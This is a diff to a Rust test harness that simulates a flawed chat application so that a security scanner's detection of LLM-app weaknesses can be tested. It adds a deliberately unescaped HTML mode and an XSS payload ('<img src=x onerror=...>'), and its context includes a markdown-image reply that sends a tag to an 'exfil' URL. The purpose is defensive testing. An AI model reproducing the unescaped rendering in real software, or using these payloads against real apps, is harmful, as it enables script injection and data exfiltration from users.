@@ -79,7 +79,9 @@ pub(super) struct Flaws {
     /// Only the first message is passed on; every later one is refused as over a limit.
     one_message_only: bool,
     /// The answer is a page of HTML with the reply in it, escaped, rather than JSON.
-    html_page: bool,
+    pub(super) html_page: bool,
+    /// Its page writes the reply's `<` and `>` as they are, escaping only `&` and `"`.
+    pub(super) html_unescaped: bool,
     /// Its instructions are a few words only.
     short_instructions: bool,
     /// Passes on at most this many messages a minute to the model, refusing the rest.
@@ -592,6 +594,7 @@ impl FakeChat {
             "IMAGE" => format!(
                 "{marker} Here is the chart: ![chart](http://sv-model:9100/_sv/exfil/{tag}.png)"
             ),
+            "MARKUP" => format!("{marker} Here it is: {}", markup_tag(tag)),
             "HIDDEN" => {
                 let smuggled: String = tag
                     .chars()
@@ -909,11 +912,16 @@ impl FakeChat {
             reply = "Thanks for your message!".into();
         }
         if self.flaws.html_page {
-            // Escaped as a template would, except the markdown turned into an image.
-            let escaped = reply
-                .replace('&', "&amp;")
-                .replace('"', "&quot;")
+            // Escaped as a template would, except the markdown turned into an image; under
+            // `html_unescaped`, only `&` and `"`, which leaves a tag in the reply a tag.
+            let mut escaped = reply.replace('&', "&amp;").replace('"', "&quot;");
+            if !self.flaws.html_unescaped {
+                escaped = escaped.replace('<', "&lt;").replace('>', "&gt;");
+            }
+            let escaped = escaped
+                .replace("&lt;img alt=chart src=&quot;", "<img alt=chart src=\"")
                 .replace("<img alt=chart src=&quot;", "<img alt=chart src=\"")
+                .replace(".png&quot;&gt;", ".png\">")
                 .replace(".png&quot;>", ".png\">");
             return ProbeResponse {
                 id: "chat".into(),
@@ -1132,6 +1140,12 @@ fn section() -> AiSection {
 }
 
 /// Every `SV-PRIVATE-` marker in a text, as the test model finds them.
+/// The tag a MARKUP reply carries: an image whose failure to load runs a line of script naming the
+/// message's tag. The test model writes it in `model-provider.mjs`; this is the fake's copy.
+pub(super) fn markup_tag(tag: &str) -> String {
+    format!("<img src=x onerror=\"document.title='SVMARKUP{tag}'\">")
+}
+
 /// A saved note as the fake app's screen leaves it: a textbook injection's words taken out.
 fn screened(text: &str) -> String {
     let lower = text.to_lowercase();
@@ -1157,7 +1171,7 @@ fn private_markers(text: &str) -> Vec<String> {
     found
 }
 
-fn ask(flaws: Flaws) -> Outcome {
+pub(super) fn ask(flaws: Flaws) -> Outcome {
     let mut app = FakeChat {
         flaws,
         ..Default::default()
@@ -2398,6 +2412,14 @@ fn each_fault_is_found_in_an_answer_that_is_a_page_too() {
                 ..Default::default()
             },
             HARMFUL.rule_id,
+        ),
+        (
+            Flaws {
+                html_unescaped: true,
+                html_page: true,
+                ..Default::default()
+            },
+            REPLY_HTML.rule_id,
         ),
     ] {
         let o = ask(flaws);
